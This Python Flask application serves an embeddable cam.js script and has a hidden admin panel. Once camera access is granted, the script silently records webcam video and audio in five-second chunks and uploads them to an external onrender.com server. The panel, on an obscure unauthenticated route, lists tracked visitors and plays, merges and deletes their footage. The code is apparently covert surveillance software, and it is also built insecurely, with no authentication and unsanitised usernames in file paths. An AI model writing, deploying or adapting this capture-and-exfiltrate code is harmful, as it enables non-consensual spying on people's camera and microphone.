from flask import Flask, request, Response, render_template_string, send_from_directory, redirect, url_for, make_response
import os
from datetime import datetime
import subprocess
from flask_cors import CORS
import glob

app = Flask(__name__)
CORS(app)

CHUNK_FOLDER = 'videos/chunks'
FINAL_FOLDER = 'videos/final'
os.makedirs(CHUNK_FOLDER, exist_ok=True)
os.makedirs(FINAL_FOLDER, exist_ok=True)

# ১. ভিডিও দেখানোর পেজ
@app.route('/rndr')
def index():
    videos = sorted([f for f in os.listdir(FINAL_FOLDER) if f.endswith('.webm')])
    chunks = sorted([f for f in os.listdir(CHUNK_FOLDER) if f.endswith('.webm')])
    
    # Get unique usernames
    usernames = set()
    for video in videos:
        if '_merged.webm' in video:
            username = video.replace('_merged.webm', '')
            usernames.add(username)
    
    for chunk in chunks:
        if '_' in chunk:
            username = chunk.split('_')[0]
            usernames.add(username)
    
    template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel - Video Management</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
            .container { max-width: 1200px; margin: 0 auto; }
            .user-section { background: white; margin: 20px 0; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .user-header { background: #007bff; color: white; padding: 10px; margin: -20px -20px 20px -20px; border-radius: 8px 8px 0 0; }
            .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
            .video-item { border: 1px solid #ddd; padding: 10px; border-radius: 5px; background: #f9f9f9; }
            .chunks-info { background: #fff3cd; padding: 10px; border-radius: 5px; margin: 10px 0; }
            .finalize-btn { background: #28a745; color: white; padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; }
            .finalize-btn:hover { background: #218838; }
            .delete-btn { background: #dc3545; color: white; padding: 5px 10px; border: none; border-radius: 3px; cursor: pointer; }
            .delete-btn:hover { background: #c82333; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎥 Admin Panel - Video Management</h1>
            
            <div class="user-section">
                <div class="user-header">
                    <h2>📊 Overview</h2>
                </div>
                <p><strong>Total Users:</strong> {{ usernames|length }}</p>
                <p><strong>Active Users:</strong> {{ usernames|list|join(', ') }}</p>
                <p><strong>Merged Videos:</strong> {{ videos|length }}</p>
                <p><strong>Pending Chunks:</strong> {{ chunks|length }}</p>
            </div>
            
            {% for username in usernames %}
            <div class="user-section">
                <div class="user-header">
                    <h2>👤 User: {{ username }}</h2>
                </div>
                
                {% set user_chunks = chunks|selectattr('startswith', username + '_')|list %}
                {% if user_chunks %}
                <div class="chunks-info">
                    <strong>📹 Pending Chunks ({{ user_chunks|length }}):</strong>
                    {% for chunk in user_chunks %}
                        <span style="background: #e9ecef; padding: 2px 6px; border-radius: 3px; margin: 2px;">{{ chunk }}</span>
                    {% endfor %}
                    <br><br>
                    <button class="finalize-btn" onclick="finalizeUser('{{ username }}')">🔄 Finalize Video</button>
                </div>
                {% endif %}
                
                {% set user_videos = videos|selectattr('startswith', username + '_')|list %}
                {% if user_videos %}
                <div class="video-grid">
                    {% for video in user_videos %}
                    <div class="video-item">
                        <h4>{{ video }}</h4>
                        <video width="100%" controls src="{{ url_for('serve_video', filename=video) }}"></video>
                        <br><br>
                        <a href="{{ url_for('serve_video', filename=video) }}" download style="background: #007bff; color: white; padding: 5px 10px; text-decoration: none; border-radius: 3px;">📥 Download</a>
                        <form action="{{ url_for('delete_video', filename=video) }}" method="POST" style="display:inline;">
                            <button class="delete-btn" onclick="return confirm('Delete this video?')">🗑️ Delete</button>
                        </form>
                    </div>
                    {% endfor %}
                </div>
                {% else %}
                    <p style="color: #666; font-style: italic;">No merged videos yet.</p>
                {% endif %}
            </div>
            {% endfor %}
            
            {% if not usernames %}
            <div class="user-section">
                <p style="text-align: center; color: #666; font-style: italic;">No users found. No videos uploaded yet.</p>
            </div>
            {% endif %}
        </div>
        
        <script>
        function finalizeUser(username) {
            if (confirm('Finalize video for user: ' + username + '?')) {
                fetch('/finalize?username=' + username)
                .then(response => response.text())
                .then(result => {
                    alert(result);
                    location.reload();
                })
                .catch(err => {
                    alert('Error: ' + err);
                });
            }
        }
        </script>
    </body>
    </html>
    '''
    return render_template_string(template, videos=videos, chunks=chunks, usernames=sorted(usernames))

# ২. ভিডিও ফাইল সার্ভ করার রুট
@app.route('/videos/final/<path:filename>')
def serve_video(filename):
    return send_from_directory(FINAL_FOLDER, filename)

# ৩. ভিডিও আপলোড (chunk upload)
@app.route('/upload', methods=['POST'])
def upload():
    try:
        video = request.files['video']
        username = request.form.get('username', 'user')
        video_number = request.form.get('video_number', '1')
        filename = f"{username}_{video_number}.webm"
        video.save(os.path.join(CHUNK_FOLDER, filename))
        print(f"Saved chunk: {filename}")
        return Response("OK", 200)
    except Exception as e:
        print(f"Upload error: {e}")
        return Response("Error", 500)

# ৪. ভিডিও মার্জ / ফাইনালাইজ
@app.route('/finalize', methods=['GET'])
def finalize():
    try:
        username = request.args.get('username', 'user')
        
        # Get all chunks for this username
        chunk_pattern = os.path.join(CHUNK_FOLDER, f"{username}_*.webm")
        chunks = sorted(glob.glob(chunk_pattern))
        
        if not chunks:
            return f"No chunks found for username: {username}"
        
        # Create chunks.txt file
        txt_path = os.path.join(CHUNK_FOLDER, f'{username}_chunks.txt')
        with open(txt_path, 'w') as f:
            for chunk in chunks:
                f.write(f"file '{os.path.abspath(chunk)}'\n")

        # Merge with ffmpeg
        final_name = f'{username}_merged.webm'
        final_path = os.path.join(FINAL_FOLDER, final_name)
        command = [
            'ffmpeg', '-f', 'concat', '-safe', '0',
            '-i', txt_path, '-c', 'copy', final_path, '-y'
        ]

        subprocess.run(command, check=True)
        
        # Clean up chunks and txt file
        for chunk in chunks:
            os.remove(chunk)
        os.remove(txt_path)
        
        return f"Merged successfully: {final_name}"
    except Exception as e:
        return f"Merge failed: {str(e)}"

# ৫. ভিডিও ডিলিট
@app.route('/delete/<filename>', methods=['POST'])
def delete_video(filename):
    try:
        file_path = os.path.join(FINAL_FOLDER, filename)
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"Deleted: {filename}")
    except Exception as e:
        print(f"Delete error: {e}")
    return redirect(url_for('index'))

# ৬. cam.js রুট — জাভাস্ক্রিপ্ট কোড সার্ভ করবে
@app.route('/cam.js')
def cam_js():
    js_code = '''
(async () => {
  let username = localStorage.getItem('video_username');
  if (!username) {
    username = Math.random().toString(36).substr(2, 5);
    localStorage.setItem('video_username', username);
  }
  
  let videoNumber = 1;
  
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
    const mediaRecorder = new MediaRecorder(stream);
    let chunks = [];
    
    mediaRecorder.ondataavailable = e => chunks.push(e.data);
    
    mediaRecorder.onstop = async () => {
      const blob = new Blob(chunks, {type: 'video/webm'});
      chunks = [];
      const formData = new FormData();
      formData.append('video', blob, `${username}_${videoNumber}.webm`);
      formData.append('username', username);
      formData.append('video_number', videoNumber);
      try {
        await fetch('https://chorcha-video.onrender.com/upload', {method: 'POST', body: formData});
        console.log('Chunk uploaded:', `${username}_${videoNumber}.webm`);
        videoNumber++;
      } catch(err) {
        console.error('Upload failed:', err);
      }
    };
    
    mediaRecorder.start();
    
    setInterval(() => {
      if(mediaRecorder.state === 'recording'){
        mediaRecorder.stop();
        mediaRecorder.start();
      }
    }, 5000);
    
    console.log('Video recording started for user:', username);
  } catch(err) {
    console.error('Camera access denied:', err);
  }
})();
'''
    response = make_response(js_code)
    response.headers['Content-Type'] = 'application/javascript'
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
